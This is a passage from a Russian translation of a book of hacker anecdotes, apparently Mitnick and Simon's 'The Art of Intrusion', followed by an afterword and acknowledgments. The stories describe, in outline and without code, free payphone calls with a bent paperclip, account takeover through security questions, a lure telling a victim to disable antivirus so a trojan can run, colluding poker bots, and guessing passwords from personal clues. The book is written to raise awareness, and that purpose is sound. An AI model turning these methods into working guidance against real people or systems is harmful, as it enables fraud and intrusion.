надежда, что и в этом случае она может открыть книгу, которая специально была взята с собой).  • «Слишком темно, чтобы читать, и слишком темно, чтобы рисовать. А играть можно, потому что экран светится». (Безнадежная попытка призвать на помощь логику).  • «Могу я по крайне мере воспользоваться Интернетом?» (Должна же быть в ваших сердцах хоть капля жалости?)  • «Ты самая лучшая мама в мире!» (Вот они, комплименты и лесть для достижения своей цели),  • «Это не честно!!!» (Последняя отчаянная попытка).  Если вы хотите усовершенствовать познания в том, как социальные инженеры манипулируют своими мишенями, и как они переводят людей из состояния размышления в чисто эмоциональное состояние …прислушайтесь к своим детям.   ПОСЛЕСЛОВИЕ   В нашей первой совместной книге Билл Саймон и я выделили уязвимость по отношению к социальной инженерии, как «самое слабое звено информационной безопасности».  Что же мы видим через три года? Мы видим, что компания за компанией развертывают у себя технологии безопасности для защиты своих компьютерных ресурсов от технологического вторжения хакеров или индустриальных шпионов и пользуются услугами серьезных охранных фирм для защиты территорий от несанкционированного вторжения.  Но мы видим при этом, какое малое внимание уделяется тому, чтобы противостоять угрозам со стороны социальных инженеров. Очень важно информировать сотрудников об этих угрозах и обучать их тому, как противостоять им и не давать себя использовать в качестве пособника атакующих. Не так-то просто противостоять угрозе вторжения со стороны человека. Защита компании от вторжения хакеров, использующих методы социальной инженерии, должна входить в обязанности всех, и каждого сотрудника в отдельности, — даже тех, кто не пользуется компьютерами по роду своей работы. Уязвимы топ-менеджеры, охранники, девушки в приемной, телефонисты, уборщики, работники гаража, а особенно— недавно принятые на работу сотрудники — все они могут подвергнуться атаке социальных инженеров, в качестве одной из ступенек на пути к конечной цели.  В течение многих лет человеческий фактор был и остается самым слабым звеном в структуре информационной безопасности. Вот вопрос на миллион долларов: хотите ли именно вы быть тем самым слабым звеном, которое использует социальный инженер для проникновения в вашу компанию?       Глава 11.    Короткие   истории      Я не являюсь ни криптографом, ни математиком. Я просто знаю, какие ошибки обычно делают люди в программных приложениях, и они делают их снова и снова.      Бывший хакер, ставший консультантом по безопасности   Некоторые истории, собранные нами в процессе написания этой книги, не укладывались в формат предыдущих глав, но были слишком интересны, чтобы забыть о них. Не все они посвящены хакерству. Некоторые из них просто увлекательны, другие посвящены манипуляциям, третьи стоит рассказать, потому что они выявляют некоторые аспекты человеческой природы … а некоторые просто смешны.  Мы наслаждались ими и надеемся, что и вам они доставят удовольствие   Н  Е  Т   ЧЕЛОВЕКА   —   Н  Е  Т   ЗАРПЛАТЫ   Джим был сержантом армии США и работал в компьютерной группе в форте Льюис в штате Вашингтон под руководством старшего сержанта, которого Джим называет «самым ненормальным человеком в мире», принадлежащего к категории людей, которые «используют свой чин для того, чтобы сделать жизнь более низких чинов невыносимой». Чаша терпения Джима и его приятелей в конце концов переполнилась, и они решили найти способ наказать грубияна за то, что он сделал их жизнь просто отвратительной.  Их группа работала с личной информацией и паролями. Для верности каждый текст набирался двумя солдатами, и, после сравнения, информация отправлялась в личное дело человека.  Идея мести, которую придумали ребята, была достаточно проста, говорит Джим. Два сотрудника сделали идентичные записи о том, что сержант скончался.  Этот факт, естественно, приостановил выплату ему заработной платы.  Когда пришел день получки, сержант пожаловался, что не получил свой чек с заработной платой. «Обычная процедура в таком случае — выписка чека вручную». Но и это не сработало. « П о некоторым непонятным причинам», говорит Джим, явно сдерживая усмешку, «его файл с личными данными никто не смог найти. Мне кажется, этот файл был уничтожен». Не трудно понять, почему Джим пришел к подобному заключению.  Компьютер показывал, что человек умер и не было никаких записей, которые доказали бы, что он существовал. Сержанту явно не повезло. Не существует процедуры, чтобы выплатить зарплату человеку, которого не было и нет. В армейскую штаб-квартиру был направлен запрос на получение копий всех бумаг сержанта, а кроме того, и о том, как платить ему до разрешения проблемы. Однако на такой серьезный запрос вряд ли можно было ожидать быстрого ответа.  У этой истории — счастливый конец. Как говорит Джим, «поведение сержанта за то время, что я знал его после случившегося, стало совсем другим».   ПРИХОДИТЕ   В   ГОЛЛИВУД  ,   ЮНЫЕ   ВОЛШЕБНИКИ   В то время, когда фильм «Парк Юрского периода—2» только вышел на экраны, юный хакер, которого мы будем звать Юки, решил, что он хочет получить контроль над сервером MCA/Universal Studios, где располагался сайт lost-world.com — Интернет-сайт кинофильма «Парк Юрского периода» и телешоу студии.  Он говорит, что это было «совершенно тривиальное хакерство», поскольку этот сайт был практически не защищен. Он проник туда при помощи метода, который он описывает в технических терминах, как «проникновение в CGI, где работал bouncer (высокий порт без защиты межсетевым экраном), так что я смог соединиться с высоким портом и соединиться обратно с локальным компьютером для полного доступа».  МСА тогда располагалась в новом красивом здании. Юки провел небольшое исследование в Интернете, узнал название архитектурной компании, построившей его, проник на их Интернет-сайт, а затем безо всяких проблем проник в сеть их компании. (Думаю, что это было так давно, что они успели залатать все очевидные дыры в своей сети).  За межсетевым экраном было несложно отыскать чертежи здания М С А в AutoCAD. Юки был очень доволен. Но это были лишь побочные цели. Его друг в тот момент был занят разработкой «нового логотипа фильма» для Интернет-страницы «Парка Юрского периода» в котором было заменено имя, а тиранозавр с открытой пастью был заменен на маленькую уточку. Они проникли на сайт, расположили там новый логотип на месте официального, и вернулись назад, чтобы посмотреть, что случится.  Результат был не совсем таким, как они ожидали. СМИ решили, что логотип забавный, но подозрительный, CNet News.com провела специальное расследование: что это было, хакерство или обман, подозревая, что кто-то в самой студии мог затеять это для привлечения внимания к фильму.  Юки говорит, что вскоре после описанных событий, он вошел в контакт со студией Universal, объяснив им, какую брешь они с другом использовали для проникновения на сайт, и рассказал также о программе «черного хода», которую они там установили. В отличие от других компаний, который стремятся во что бы то ни стало узнать личность того, кто проник в их сеть или на Интернет-сайт, сотрудники Universal поблагодарили его за информацию.  Более того, говорит Юки: они предложили ему работу — решили, что он может быть им полезным в нахождении и устранении других лазеек. Юки был глубоко взволнован их предложением.  Однако, не сложилось. «Когда они обнаружили, что мне всего шестнадцать лет, то попытались обмануть меня». Поэтому он отказался.  Через два года CNet News.com представила список из десяти их любимых хакерских вторжений. Юки с удовольствием обнаружил там и свою историю с «Парком Юрского периода».  Но его хакерские дни были сочтены, говорит Юки. Он «уже пять лет, как сошел со сцены». После отказа от предложения М С А он начал работать консультантом, чем и занимается до сих пор...   Страницы 264-265 отсутствуют   ...того, они собирали все больше «боевых приказов» иракских оборонительных сил и узнавали их численность, расположение, назначение и даже планы действий.  В конце концов, иракские войска были вынуждены отказаться от радиосвязи в своих войсках, занявшись вместо этого прокладыванием телефонных линий. И здесь американцы неотступно следовали за ними. Иракские военные полагались на старые обычные телефонные линии, не составляло никакого труда проникнуть в любую из них с шифровальным передатчиком, и передавать все, что идет по этой линии в военную разведку.  Американские знатоки языка фарси опять взялись за работу, используя на этот раз тот же метод, который они применяли раньше для разрушения радиосвязи. Можно представить себе выражение лица какого-нибудь полковника или генерала, когда в его ушах звучал все тот же голос, но уже по телефонной линии: «Привет, это опять „Браво-5“. Как идут дела?»  Они вполне могли добавить и что-то еще более издевательское, типа: «Нам очень не хватало вас, как здорово опять встретиться».  В этот момент у иракских военных просто не оставалось возможностей для современной связи. В качестве последнего средства они стали писать свои приказы на бумаге и посылать пакеты на машинах к полевым командирам, которые писали ответы и посылали машины назад через жаркую и пыльную пустыню в штаб. Самый простейший запрос и ответ отнимали много часов. Практически невозможно стало скоординировать действия нескольких частей, поскольку для этого надо было тщательно рассчитывать одновременную доставку пакетов к каждой из них.  Это был явно неэффективный способ противостоять быстро передвигающимся американским войскам.  Вскоре после того, как началась война в воздухе, перед группой американских летчиков была поставлена задача отслеживать машины, перевозящие приказы между известными местами расположения иракских частей. Летчики начали выслеживать эти машины и выводить их из строя. Буквально через несколько дней иракские водители отказались перевозить пакеты между войсками, поскольку они поняли, что это верная смерть.  Все это означало практически полный выход из строя системы управления и командования в иракской армии. Даже когда центральному командованию Ирака удавалось передать войскам ту или иную команду по радио, рассказывает Майк, «войска приходили в ужас, поскольку они знали, что все то же самое слышат и американские военные, и эта информация будет использована для организации атаки на их расположение, особенно если войска решались ответить на приказ, что означало, что они живы и их тем более надо уничтожать». Чтобы хоть как-то попытаться сохранить жизнь, некоторые иракские подразделения выводили из строя свои уцелевшие устройства связи, чтобы они не могли принимать входящие приказы.  «Короче говоря, — вспоминает Майк с явным удовлетворением, — иракская армия достаточно быстро пришла в состояние хаоса и бездействия на многих участках фронта, поскольку никто не мог — или не хотел — связываться с другими частями».   СЕРТИФИКАТ   НА   ПОДАРОК В   МИЛЛИАРД   ДОЛЛАРОВ   Все, что вы прочтете сейчас, прямая цитата из нашего разговора с одним бывшим хакером, который сейчас — уважаемый и процветающий консультант в области безопасности.  «Суть очень проста, приятель. „Почему вы грабите банки, мистер Хор-тон?“. — „Потому что там много денег“.  Я расскажу вам забавную историю. Мы с одним парнем Фрэнком из агентства национальной безопасности — я не буду называть его настоящего имени, потому что он сейчас работает на Microsoft — получили заказ на проверку системы защиты (тест на проникновение) от компании, которая изготавливала цифровые подарочные сертификаты. Я не буду называть и их.  Что же мы там натворили? Думаете, взломали шифр в подарочном сертификате? Ничуть не бывало — тут все было сделано по высшему разряду. Сертификаты был качественно защищены и пытаться взломать их было пустой тратой времени. Что же мы решили атаковать? Мы решили понять, как торговцы «обналичивают» эти сертификаты. Это была своеобразная атака изнутри, поскольку нам было разрешено пользоваться именем и паролем торговца. Мы довольно быстро нашли брешь в его системе, которая позволяла нам исполнять с его компьютера любую команду. Э т о было совершенно детское и несложное занятие, которое не требовало никаких особых талантов и умений, надо было просто хорошо знать, что вы ищете. Я не являюсь ни криптографом, ни математиком. Я просто знаю, какие ошибки обычно делают люди в программных приложениях, и они делают их снова и снова. В той же самой сети, где был расположен центр обналичивания сертификатов, у них было соединение с машиной, которая изготавливала эти сертификаты. Мы влезли в эту машину из компьютера, которому она доверяла. Вместо того, чтобы проникать в корневую директорию, мы просто изготовили сертификат, содержащий тридцать два бита и на нем была указана сумма подарка в долларах.  У меня до сих пор есть этот сертификат на один миллиард и девятьсот миллионов долларов. И это абсолютно законный сертификат. Кто-то сказал, что надо было его оформить в английских фунтах, тогда денег было бы еще больше.  После этого мы пошли на сайт известного магазина Gap и купили пару носков. А расплатились за нее нашим сертификатом, предвкушая неплохую сдачу.  А носки потом можно было бы прикрепить к нашему отчету о проделанной работе».  Но он не сделал этого. Ему не понравилось, как эта историю могут воспринять слушатели, и он продолжил рассказ, чтобы не оставлять неправильного впечатления.  «Может, мои слова звучат, как фантазии какой-то рок-звезды, но все, что вы видите — это путь, которым я прошел, а вы восхищаетесь: „О, господи, как он умен. Он проник в компьютер, а затем оттуда проник в машину, изготавливающую сертификаты и сделал нужный ему сертификат“.  В с е так, н о в ы знаете, насколько «сложно» э т о б ы л о ? Э т о был элементарный перебор попыток: «Давай попробуем так — работает?». Не получилось. «Теперь так — работает?». Опять не получилось. Элементарный метод проб и ошибок. Немного фантазии, настойчивости и удачи. И совсем чуть-чуть умения. Я до сих пор храню эти носки».   ПОКЕРНОЕ   ХАКЕРСТВО   В   ТЕХАСЕ   Игроки в покер обычно думают, что сидя за столом в одном из крупных казино, даже играя в одну из самых популярных игр «Texas Hold'Em», под бдительными глазами охраны, крупье и всевидящих камер наблюдения, они могут полагаться на свое мастерство и удачу и не беспокоиться о том, что их обманут другие игроки.  Сегодня, благодаря Интернету, можно сидеть за покерным столом электронным образом, играя в полном комфорте на своем компьютере на деньги, против таких же игроков, сидящих где угодно, в любых частях света.  Вот тогда и появляется хакер, который находит способ получить для себя огромное преимущество, используя «бота» — электронного робота. Один из хакеров, Рон, говорит, что написал специальную программу — «бот, который играет в математически совершенный покер в режиме онлайн, создавая у противников впечатление, что они играют с обычным человеком». Кроме того, что он зарабатывал приличные деньги в ежедневных играх, он со своим ботом участвовал во многих турнирах с неизменным успехом. «В одном четырехчасовом турнире, где не требовался первоначальный взнос, бот закончил игру на втором месте».  Все складывалось как нельзя лучше, пока Рон не сделал ошибку: он решил выставить свой бот на продажу по цене 99 долларов в год для всех желающих. Слух о программе быстро распространился среди игроков и те, кто часто играл на покерном сайте, стали беспокоиться о том, что они в любой момент могут оказаться за столом с таким ботом. «Это вызвало такое возмущение у посетителей сайта (и озабоченность руководства казино тем, что они потеряют клиентов), что сайт создал специальную программу, которая выявляла присутствие моего бота, а тем, кто его применял, грозил запрет играть на сайте». Пришло время менять стратегию.  «После безуспешных попыток сделать бизнес на технологии бота, я решил весь проект перевести в тайную плоскость. Я модифицировал бот таким образом, чтобы он мог играть на одном из крупнейших покерных сайтов в „командной моде“, так, чтобы два или более ботов за одним столом могли обмениваться информацией о своих скрытых картах, чтобы получать выгоду от этого».  В своем первом электронном письме о своих делах Рон упоминал, что его боты по-прежнему «в работе». Потом он написал нам, попросив сделать официальное заявление:  «После нанесения тяжкого финансового ущерба тысячам игроков в покер, Рон принял окончательное решение не использовать свою технологию против других».  И все же, любители покера, вы должны понимать, что если это удалось Рону, то это могут сделать и другие. Может быть, вам лучше отказаться от планов покорить Лас-Вегас?   ЮНЫЙ   Б  О  Р  Е  Ц   С   ПЕДОФИЛАМИ   Мы с моим соавтором считаем эту историю совершенно неотразимой. Даже если она правдива не на сто процентов, мы решили рассказать ее, не редактируя даже стиль изложения.  «Все это началось, когда мне было пятнадцать лет. Мой друг, Адам, показал мне, как бесплатно звонить из школьного телефона-автомата, который располагался неподалеку от школьной столовой. Это был первый раз, когда я сделал что-то противозаконное, хоть и удаленным образом. Адам изгибал скрепку таким образом, что она повторяла формы чипа телефонной карты, потом всовывал кусок бумаги в слушающую часть телефонной трубки. Затем он набирал номер, по которому хотел позвонить, придерживал последнюю цифру и в тот же момент всовывал кусок бумаги в микрофон телефонной трубки. После этого следовала серия коротких гудков, а потом происходило соединение. Я был совершенно потрясен. Впервые в жизни я понял, каким могущественным может быть знание.  С того момента я начал читать все, что попадало в мои руки. Если это была скрытая информация, то я старался заполучить ее. Я использовал фокус с куском бумаги в течение всей моей учебы в старших классах школы, пока не вступил на еще более скользкую дорожку. Постепенно я начал задумываться, как далеко я собираюсь идти по этой дорожке. При этом я все время думал о том, что я делаю что-то «плохое», а это уже достаточный стимул для того, чтобы привести пятнадцатилетнего парня в область темных делишек.  Далее пришло осознание того, что для хакерства нужно нечто большее, чем знание. Надо иметь какой-то внутренний стимул для того, чтобы организовывать различные ловушки.  От моего друга по онлайн-общеиию я узнал о программах под названием трояны, одну из которых он загрузил в мой компьютер. Он мог делать удивительные вещи, например, знать, что я печатаю, записывать все, что регистрировала моя видеокамера и массу подобных вещей. Я был просто на небесах. Я стал исследовать, что я могу сделать с этим трояном. и начал встраивать его в разные программы. После этого я отправлялся в чаты и предлагал разным людям загрузить к себе эти программы, но никто мне не верил и  … они имели для этого все основания.  Тогда я отправился на сайт, где общались дети, и нашел там человека, которого интересовали фотографии детей и подростков. Сначала я воспринял все это, как шутку, но потом решил попытаться сделать из него жертву.  Я начал общаться с ним от имени девочки, которая якобы искренне хотела встретиться с ним однажды, правда, не совсем так, как хотелось ему. Мой соперник был слаб и хил, если не сказать больше. Мой инстинкт пятнадцатилетнего юноши жаждал всемирной справедливости. Я хотел посрамить этого человека, чтобы он в следующий раз глубоко задумался перед тем, как опять затеять охоту на детей. Я самыми разными способами пытался послать ему трояна, но он был умнее меня. У него было установлено антивирусное программное обеспечение, которое блокировало все мои попытки. При этом он ни разу даже не заподозрил меня. Он думал, что мой компьютер заражен этими вирусами, поэтому они прикрепляются к картинкам, которые я ему посылал. Я в данном случае играл «под дурочку».  Через несколько дней общения он стал более настойчивым. Он требовал моих откровенных фотографий и говорил, что любит меня и хочет со мной встретиться. Это был первоклассный подонок и прекрасная мишень для того, чтобы осуществить на него атаку без малейшего сожаления о сделанном, Я собрал о нем достаточно информации для того, чтобы получить доступ к некоторым его электронным письмам. Вы прекрасно знаете те вопросы, что там задают: «Какой ваш любимый цвет?» «Какова девичья фамилия вашей матери?». Все, что мне надо было сделать, это получить эту информацию от него и вот — я уже в его электронной почте.  То, чем он занимался, было противозаконно. Например, порнографические фотографии детей разного возраста. Это было очень неприятно.  Затем меня буквально озарило. Если он не воспринимает троян от меня, то он может получить его от одного из своих порнографических клиентов. Я использовал один из таких адресов электронной почты и написал ему короткое послание:   Проверь это письмо. Отключи свою антивирусную программу перед этим, поскольку она ухудшает качество изображений.   PS.   Ты мне должен …   Я был уверен, что он клюнет на это, и я ждал целый день, пока он прочтет письмо. Я не бросал своей затеи и совсем не думал о социальной инженерии.  И наконец, около одиннадцати часов вечера мне повезло: я получил послание от моего трояна, что он установлен на его компьютере. Я сделал это!  Я получил доступ и сразу же начал копировать доказательства тому в свою папку (которую предусмотрительно создал у себя на компьютере); я назвал ее jailbait («приманка для тюрьмы»). Я очень много узнал об этом человеке. Его имя, адрес, место работы и даже те документы, над которыми он работал в данный момент времени.  Я не мог позвать агентов ФБР или даже сотрудников местной полиции (поскольку я боялся, что меня накажут за проникновение в чужой компьютер), которые могли посадить меня в тюрьму, чего я очень боялся. В конце концов я понял, что он женат и у него есть дети. Это было ужасно.  Я сделал одну вещь, которую просто должен был сделать. Я послал его жене электронное письмо со всей информацией из директории «приманка для тюрьмы». После чего я спрятал свои следы и убрал трояна.  Это был мой первый опыт, когда в работе участвовали не только коды, но и эмоции. После того, как я получил доступ, я понял, что это еще далеко не все. Требовалось нечто большее, чем просто знание, требовалась хитрость, ложь, манипуляции и тяжелый труд. Но все эти усилия были оправданы, чтобы вывести эту мерзость на чистую воду. Я чувствовал себя королем в мои пятнадцать лет. И все, что произошло, я не мог рассказать ни одной живой душе.  Я хотел бы никогда не видеть того, что я видел».   ТОЛЬКО   НЕ   СТАНЬ   ХАКЕРОМ  !   Как ясно из историй, рассказанных в этой книге, большинство хакеров потратили долгие годы, прежде чем овладеть мастерством. Меня всегда поражало проявление хакерских навыков у тех, кто никогда этим не занимался. Вот одна из таких историй.  Когда все это произошло, Джон учился в колледже и специализировался в компьютерных науках, при этом он подрабатывал в местной электрической и газовой компании, чтобы к концу обучения иметь хотя бы какой-то опыт работы. Компания поручила ему заниматься продвижением программы Lotus Notes среди сотрудников. Каждый раз, когда он кого-то приглашал к себе на разговор, он спрашивал у него его пароль для Lotus Notes, чтобы провести модернизацию. Никто не отказывался.  В некоторых случаях ему не удавалось получить пароль, но он понял, что это не очень-то и надо: «Я обнаружил, что восемьдесят процентов людей никогда не меняют свой пароль вне зависимости от того, какая версия Notes у них устанавливается, поэтому моя первая попытка в поисках такого пароля всегда была „pass“».  Если этот вариант не приводил к успеху, Джон проникал в офис человека и смотрел, что написано на бумажке, приклеенной к его монитору, или же запрятанной (хотя вряд ли это правильное слово для подобного действия…) глубоко под клавиатурой, или еще где-то неподалеку.  Если все эти действия не достигали успеха, у него был еще один способ: «моя последняя атака заключалась в поиске чего-то личного на его столе — имен детей, любимых занятий и чего-то подобного». Нескольких попыток было более, чем достаточно.  «Один раз, правда, было сложнее, чем обычно. Я до сих пор помню пароль одной женщины… На каждой из ее картинок был мотоцикл». Он попробовал «harley» и… угадал.  Вдохновленный своим успехом, он начал просматривать ее файлы: «Я просмотрел множество файлов, причем в каждом я оставался не более десяти минут. Это была самая невинная информация из тех, с которыми мне приходилось иметь дело, это были отчеты о днях рождения детей. Все это научило меня тому, насколько слаба наша защита от вторжений, точнее — ее первая линия, наши пароли».  Кажется, это доходчивое послание всему миру: если каждый пользователь сделает свой пароль более сложным, и не будет его записывать где-то, то завтра мы проснемся в более безопасном мире!  Я думаю, эти простые слова станут руководством к действию для каждого, кто прочел эту книгу.   Благодарности   ОТ   КЕВИНА   МИТНИКА   Эту книгу я посвящаю моей чудесной семье, близким друзьям и, главное, людям, которые помогли этой книге появится на свет — тайным и явным хакерам, поведавшим истории из своей жизни для нашего обучения и развлечения.   Искусство вторжения было гораздо сложнее писать, чем нашу предыдущую книгу. Вместо того, чтобы использовать наши творческие способности для изложения историй и анекдотов, иллюстрирующих опасности социальной инженерии, и раздавать советы, как снизить опасность, мы с Биллом Саймоном сосредоточились на интервьюировании хакеров, фрикеров (телефонных мошенников) и бывших хакеров, ставших профессионалами в области безопасности. Мы хотели написать книгу, которая бы одновременно была увлекательным детективом и открывала глаза бизнесменам, помогая им защитить их ценную информацию и вычислительные ресурсы, Мы совершенно уверены, что раскрывая основные технологии и методологии, используемые хакерами для проникновения в системы и сети, мы сможем повлиять на то, как все сообщество будет относиться к исходящей от них угрозе.  Мне невероятно повезло сотрудничать с таким автором бестселлеров, как Билл Саймон, и мы вместе с ним активно работали над новой книгой. Билл умеет излагать полученную нами от хакеров информацию таким простым и понятным языком, что любая бабушка в ней разберется. Еще более важно то, что Билл стал для меня не только соавтором, но настоящим другом и оставался им на протяжении всего долгого процесса создания книги. У нас были моменты разногласий и расхождений во мнениях в этот период, но мы всегда находили выход, который устраивал нас обоих. Через два с небольшим года (после того, как истечет время некоторых правительственных запретов) я планирую написать и опубликовать книгу «Неизвестная история Кевина Митника». Надеюсь, что мы с Биллом будем вместе работать над ней.  В моем сердце большое место занимает и чудесная супруга Билла, Айрин Саймон. Я очень благодарен ей за ее любовь, доброту и заботу, которую ощущал, общаясь с ней все три последних года. Единственное мое разочарование заключается в том, что мне так и не удалось отведать ее удивительных кулинарных творений. Надеюсь теперь, когда книга наконец-то закончена, мне удастся убедить ее приготовить специальный праздничный обед!  Сконцентрировавшись на книге «Искусство вторжения», я не мог уделять достаточно времени своей семье и моим друзьям. Я превратился в трудоголика, как это уже бывало в те времена, когда я проводил бесчисленные часы за клавиатурой компьютера, исследуя темные углы киберпространства.  Я хочу поблагодарить мою любящую подругу, Дарси Вуд и ее очаровательную дочку Брианну за то, что они были терпеливы и поддерживали меня в процессе написания книги. Спасибо, родные мои, за любовь и поддержку, которую вы оказали мне в работе над этим и другими нелегкими проектами.  Эта книга не появилась бы без любви и поддержки моей семьи. Моя мама, Шелли Джаффе и моя бабушка, Реба Вартанян, окружали меня безусловной любовью и поддержкой на протяжении всей жизни. Мне невероятно повезло, что меня вырастила такая внимательная и заботливая мать, которая стала моим лучшим другом. Второй мамой была для меня моя бабушка, даря мне любовь и заботу, на которую способна только мать. Она очень помогала в некоторых моих делах, которые в то время пересекались с ее деятельностью. Всегда она ставила на первое место мои дела, даже если это было неудобно для нее. Спасибо, бабушка, за безотказную помощь в моей работе, которую я получал, когда бы она ни понадобилась. Как все заботливые люди с развитым чувством сострадания, они научили меня сочувствию к другим людям, и умению протягивать руку помощи тем, кому не повезло. Когда я пытался кому-то помочь или заботился о ком-то. я на самом деле просто копировал их стиль поведения. Надеюсь, они простят меня за то, что я не мог видеться с ними в процессе написания этой книги, отодвигая общение с ними на второй план. Повторяю, эта книга никогда не появилась бы без их постоянной любви и поддержки, которую я навеки сохраню в своем сердце.  Я желаю моему отцу, Алану Митнику, и моему брату, Адаму Митнику, долгой жизни, чтобы они вместе со мной смогли выпить по бокалу шампанского, когда моя вторая книга появится в магазинах. Как владелец бизнеса и специалист по продажам, мой отец научил меня многим важным вещам, которые я никогда не забуду.  Друг моей мамы. Стивен Книтл, был для меня отчимом последние двенадцать лет. Мне всегда было спокойнее оттого, что он заботится о моей маме, когда меня нет рядом с ней. Его уход стал сильной утратой для нашей семьи, нам всем не хватает его юмора, веселья и любви, которую он принес нам.  Особое место в моем сердце занимает моя тетя Чикки Левенталь. За последние годы связь между нашими семьями укрепилась, и наше общение стало просто прекрасным. Когда бы мне ни требовался совет или просто место для ночлега, она всегда была готова помочь и поддержать меня. Отдавая все свое время написанию книги, я упустил много возможностей общения с тетей, а также с моей двоюродной сестрой Митч Левенталь и ее спутником, доктором Робертом Берковичем.  Мой друг Джек Биелло проявил себя любящим и заботливым человеком, он выступал против несправедливых обвинений в мой адрес со стороны журналистов и правительственных чиновников. Он был лидером движения «Свободу Кевину» и тем автором, который писал убедительные статьи, донося до общества ту информацию, которую правительство не допускало к нему. Джек всегда бесстрашно выступал от моего имени, вместе со мной подготавливал мои статьи и речи, и был для меня своеобразным агентом по связям с общественностью. Джек ушел от нас два года назад, когда я заканчивал книгу «Искусство обмана», но до сих пор он в моем сердце.  Каролин Бергерон. мой очень близкий друг, активно поддерживала мой второй книжный проект. Она работает адвокатом и отдавала все свои таланты чтению корректур, редактуре и проверке текстов во время двухдневного семинара по социальной инженерии, который мы с Алексом Каспером организовали. Спасибо, Каролин, за помощь.  Мой коллега Алекс Каспер (Alex Kasper) — не только мой лучший друг, но и товарищ по работе; мы вместе с ним организуем однодневные и двухдневные семинары, посвященные методам защиты бизнеса от атак социальных инженеров. Вместе с ним мы ведем популярное ток-шоу об Интернете «Темная сторона Интернета» на KFI-радио в Лос-Анджелесе. Алекс, ты мой большой друг и надежный человек. Спасибо тебе за неоценимую помощь и советы. Ты всегда оказывал на меня положительное влияние, ты помогал мне своей необычайной добротой и великодушием.  Поль Дриман — друг нашей семьи в течение долгих-долгих лет, После кончины моего отца Поль стал для меня фигурой, сравнимой с ним по значимости, он всегда был готов общаться со мной, обсуждать мои проблемы и помогать советами. Спасибо, Поль, за твою лояльность и дружбу с отцом и мной в течение долгих лет.  Эми Грей в течение последних трех лет учила меня выступать. Я не только восхищаюсь ее выдающейся личностью, но я очень ценю, как она умеет относиться к другим людям — с вниманием и уважением. Ваша поддержка и профессионализм очень помогли моему успеху на поприще публичных выступлений. Спасибо за Вашу дружбу и постоянное стремление к совершенству.  Адвокат Грегори Винсон входил в состав команды моих защитников в течение моего многолетнего сражения с правительством. Его можно сравнить только с Биллом за понимание и терпимость к моему перфекционизму; только у него был аналогичный печальный опыт работы со мной над официальными письмами, которые он писал от моего имени. Сейчас Грегори работает моим адвокатом, помогая мне в моих новых деловых контрактах и начинаниях. Спасибо вам за удивительную поддержку и усердный труд, особенно в экстренных случаях.  Эрик Корли (известный также как Эммануэль Голдстейн) был активным сторонником и моим близким другом в течение десяти лет. Он всегда отстаивал мои интересы и публично защищал меня в то время, как меня демонизировали кинокомпания Miramax Films и многие журналисты. Эрик всегда умел отыскать необходимое слово в ходе судебного разбирательства. Твоя доброта, великодушие и дружелюбие значат для меня гораздо больше, чем можно выразить словами. Спасибо за твою верную дружбу.  Стив Возняк и Шарон Акерс много своего времени потратили, помогая мне, как в деловых, так и в жизненных вопросах. Ваша готовность отказаться от своих дел и мчаться на помощь всегда грела мне душу, поэтому я с удовольствием звоню вам обоим. Надеюсь теперь, когда моя книга завершена, у нас будет больше времени для того. чтобы собраться вместе и затеять что-нибудь интересное. Стив, я никогда не забуду то время, когда ты, Джефф Самуэльс и я ехали ночью в твоем Хаммере в Дефкон в штате Лас-Вегас. Мы постоянно сменяли друг друга за рулем, так что могли проверять свою почту и болтать в чате с приятелями через беспроводное GPRS-соединение.  В процессе написания этого раздела благодарностей я осознал. как многих людей я хочу поблагодарить и выразить свою признательность за их любовь, дружбу и поддержку. Я даже не могу припомнить сразу имена всех тех добрых и великодушных людей, которых я встретил в последние годы, для того, чтобы перечислить их, не хватит и объема хорошей «флэшки»! Так много людей со всего мира написали мне слова поддержки, похвалы и ободрения! Эти слова значили для меня очень много, особенно в те моменты, когда я в них очень нуждался.  Я особенно благодарен всем моим с т о р о н н и к а м , которые б ы л и р я —дом со мной, и тратили свое ценное время и энергию на то, чтобы высказать всем тем, кто захочет слушать, слова озабоченности и протеста против несправедливого обвинения в мой адрес и гиперболизации моей вины теми, кто хотел извлечь выгоду из «мифа Кевина Митника».  Я очень хочу поблагодарить тех, кто помогал мне в моей работе самыми разными способами. Дэвид Футейт из Waterside Productions, мой издательский агент, который бился за меня в самых разных ситуациях, и до, и после того, как был подписан контракт на издание книги.  Я очень благодарен издательству Wiley&Sons за возможность стать автором еще одной книги и за их стремление сделать вместе со мной бестселлер. Мне хотелось бы специально поблагодарить сотрудников издательства, которые сделали эту мечту возможной: Эллен Герштейн, Боба Ипсена, Кароль Лонг — всегда четко отвечал на мои просьбы и заботы (мой контакт № 1 в издательстве и исполнительный редактор), Эмили Херман и Кевин Шафер (ответственный редактор), которые работали с нами как одна команда, чтобы довести работу до конца.  Я слишком много общался с юристами и хочу выразить благодарность тем, кто в течение долгих лет моих печальных взаимодействий с системой юстиции предлагал мне свои услуги, когда я в них особенно нуждался. Я встречал многих адвокатов, которые не соответствовали общепринятому мнению об адвокате, как об эгоцентричном и самовлюбленном человеке, и помогали мне, чем могли — от добрых слов до глубокого участия в моем деле. Я испытываю глубочайшее уважение и признательность ко всем этим людям за их доброту и великодушие, которые они дарили мне свободно и бескорыстно. Все они заслужили упоминания в этом параграфе; считаю своим долгом хотя бы перечислить их по именам, поскольку в моем сердце жива признательность каждому из них, это: Грег Аклин, Фрэн Кэмпбелл, Лорен Колби, Джон Дюзенбюри, Шерман Эллисон, Омар Фигероа, Джим Френч, Каролин Хагин, Роб Хейл, Дэвид Малер, Ральф Перец, Альвин Михаэльсон, Дональд С. Рэндольф. Алан Рубин, Тони Серра, Скип Слейте, Ричард Стейнгард, Роберт Тэлкот, Барри Тарлоу. Джон Изурдиага и Грегори Винсон.  Не могу не отметить и еще некоторых членов семьи, друзей, помощников в бизнесе, которые помогали мне в делах и в жизни самыми разными способами. Вот они: Дж. Эбрамс, Шарон Экерс, Мэтт «NullLink» Бэкман, Алекс «CriticalMass» Берта, Джек Биелло. Серж и Сюзанна Бирбраир, Поль Блок. Джефф Боулер, Дейв Деланси. Мэтт «404» Бурке, Марк Барнетт. Томас Кэннон, Грейс Энн и Перри Чавес, Дейл Коддингтон, Маркус Коломбано, Эд Каммингс, Ясон «Cypher» Саттерфилд, Роберт Дэвис, Дейв Деланси, Реверенд Диджитал. Ой-винд Доссланд. Сэм Доулинг, Джон Дреппер, Ори Айзен, Рой Эскапа, Алекс ФИЛДИНГ, Эрин Фин, Гэри Фиш и Фишнет Секьюрити, Лиза Флорес, Брок Франт, Грегор Френд, Шон Гайли и вся команда Jinx, Майкл и Катя Гарднер, Стив Гибсон, Роп Гонгрип, Джерри Гринблат, 